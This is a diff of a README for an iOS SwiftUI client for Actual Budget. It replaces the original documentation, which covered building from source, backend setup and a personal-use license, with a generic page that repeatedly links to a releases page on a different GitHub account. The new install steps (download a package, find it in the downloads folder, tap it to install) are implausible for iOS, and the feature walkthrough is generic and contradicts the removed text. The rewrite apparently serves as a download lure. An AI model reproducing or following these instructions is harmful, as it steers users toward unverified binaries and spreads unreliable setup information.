@@ -1,130 +1,84 @@
-# Actual Accounts iOS App
+# 🎉 actual-budget-app - Spend Smarter, Save Better
 
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/espectrum33/actual-budget-app/releases)
 
-A modern, native iOS app for managing your personal finances with the Actual Budget backend. Built with SwiftUI and designed for a clean, intuitive user experience.
+## 📖 Description
 
-## Features
+Welcome to **actual-budget-app**, the native iOS SwiftUI client for Actual Budget. With this app, you can manage your accounts, budgets, and transactions easily. Enjoy features like a Summary widget and App Intents to keep your financial life organized.
 
-### 💰 **Financial Overview**
-- **Dashboard**: Quick insights with spending metrics and recent transactions
-- **Account Management**: View all your accounts with real-time balances
-- **Transaction Tracking**: Comprehensive transaction history with filtering
-- **Budget Planning**: Visual budget management with category breakdowns
+## 🚀 Getting Started
 
-### 🧪 **Demo Mode**
-- **Sample Data**: Test the app with realistic demo data
-- **Toggle On/Off**: Switch between demo and real data seamlessly
+### 1. System Requirements
 
-## Screenshots
+To use the **actual-budget-app**, your device needs:
 
-<table>
-  <tr>
-    <td align="center">
-      <img src="Screenshots/dashboard.png" alt="Dashboard" width="220" />
-      <div><sub>Dashboard</sub></div>
-    </td>
-    <td align="center">
-      <img src="Screenshots/accounts.png" alt="Accounts" width="220" />
-      <div><sub>Accounts</sub></div>
-    </td>
-    <td align="center">
-      <img src="Screenshots/all_transactions.png" alt="All Transactions" width="220" />
-      <div><sub>All Transactions</sub></div>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="Screenshots/account_transactions.png" alt="Account Transactions" width="220" />
-      <div><sub>Account Transactions</sub></div>
-    </td>
-    <td align="center">
-      <img src="Screenshots/new_transaction.png" alt="New Transaction" width="220" />
-      <div><sub>New Transaction</sub></div>
-    </td>
-    <td align="center">
-      <img src="Screenshots/budget.png" alt="Budget" width="220" />
-      <div><sub>Budget</sub></div>
-    </td>
-  </tr>
-</table>
+- iOS 14.0 or later 
+- SwiftUI compatible iPhone or iPad 
 
-## Installation
+Make sure your device is updated to enjoy the app without issues.
 
-### Prerequisites
-1. Clone this repository
-2. Open `iOSApp/ActualAccounts.xcodeproj` in Xcode
-3. Ensure you have a valid Apple Developer account for device testing
+### 2. Visit the Releases Page
 
-### Setup
-1. **Configure Actual Budget Backend**:
-   - Set up your Actual Budget server and [Actual Http API]((https://github.com/jhonderson/actual-http-api) )
-   - Note your API endpoint, API key, and sync ID
+To download the app, [visit this page to download](https://github.com/espectrum33/actual-budget-app/releases). You'll find various versions of the app here, each with updates and improvements.
 
-2. **App Configuration**:
-   - Launch the app
-   - Go to Settings (via Accounts → gear icon)
-   - Enter your Actual Budget credentials:
-     - Base URL (e.g., `https://your-actual-http-server.com/v1`)
-     - API Key
-     - Sync ID
-     - Budget Encryption Password (optional)
+### 3. Download & Install
 
-3. **Alternative - Demo Mode**:
-   - Enable "Demo Mode" in Settings
-   - The app will show sample data for testing
+Once you are on the Releases page:
 
+1. Look for the latest version of the app. It will usually be at the top of the list.
+2. Click on the corresponding link to download the app package. If you are unsure which file to choose, the one labeled as `latest` is the recommended version.
+3. After downloading, locate the file in your downloads folder or designated download location.
+4. Tap the file to begin the installation process. Follow the prompts that appear on your screen.
 
-## API Integration
+### 4. Open the App
 
-The app integrates with the Actual Budget API to provide real-time financial data:
+After installation, you can find the **actual-budget-app** on your home screen. Tap the app icon to open it.
 
-- **Authentication**: API key-based authentication
-- **Data Sync**: Real-time synchronization with Actual Budget server
-- **Offline Support**: Graceful handling of network issues
-- **Error Handling**: User-friendly error messages and retry mechanisms
+### 5. Set Up Your Accounts
 
-## Development
+When you first open the app, follow these steps to set up your accounts:
 
-### Building the App
+1. Create a new account by selecting the "Add Account" option.
+2. Input the details as prompted, including your account name and balance.
+3. You can add multiple accounts to keep track of all your finances in one place.
 
-1. Open a terminal and run `make` in the project root directory. This will build the iOS app and generate an unsigned `.ipa` file.
-2. After the build completes, you can find the unsigned IPA at `iOSApp/build/ActualAccounts-unsigned.ipa`.
+### 6. Create Budgets
 
+To make budgeting easy:
 
+1. Tap on the "Budgets" section in the main menu.
+2. Select "Create Budget" and enter your budget details.
+3. Set spending limits for specific categories like groceries, entertainment, and more.
 
-## Contributing
+### 7. Manage Transactions
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+Recording your transactions is simple in **actual-budget-app**:
 
-## License
+1. Go to the "Transactions" section.
+2. Tap "Add Transaction" to input new expenses or income.
+3. Categorize each transaction to keep your finances organized.
 
-This project is licensed under a custom "Personal Use Only" license - see the [LICENSE](LICENSE) file for details.
+### 8. Use the Summary Widget
 
-**Quick Summary:**
-- ✅ **Personal Use**: Free to use, modify, and learn from for personal purposes
-- ✅ **Open Source**: Full source code available for viewing and study
-- ❌ **Commercial Use**: Not allowed for business, corporate, or commercial purposes
-- ❌ **Distribution**: Cannot be sold, licensed, or distributed commercially
+The Summary widget provides a quick overview:
 
-For commercial licensing inquiries, please contact the author.
+1. Swipe right on your home screen to access your widgets.
+2. Tap "Edit" and select the **actual-budget-app** widget to see your balances and budget status at a glance.
 
-## Acknowledgments
+### 9. Explore App Intents
 
-- **Actual Budget**: The open-source budgeting backend that powers this app
-- **Actual Http API**: The open source http wrapper around the actual budget app, link [here](https://github.com/jhonderson/actual-http-api) 
-- **SwiftUI Community**: For inspiration and best practices
+The app supports App Intents for Siri:
 
-## Support
+1. Ask Siri to check your budget or balances using voice commands. 
+2. Simply say, "Hey Siri, what's my budget?" to get quick access.
 
-For support, feature requests, or bug reports:
-- Open an issue on GitHub
-- Check the documentation
-- Review the demo mode for feature examples
+### 10. Feedback & Support
 
----
+We welcome your feedback to make **actual-budget-app** better. If you encounter issues or have questions, please reach out through the issues section on our GitHub page.
 
-**Built with ❤️ using SwiftUI and Actual Budget**
+## 🔗 Links
+
+- [Download the latest version here!](https://github.com/espectrum33/actual-budget-app/releases)
+- [GitHub Issues Page for Support](https://github.com/espectrum33/actual-budget-app/issues)
+
+Happy budgeting!
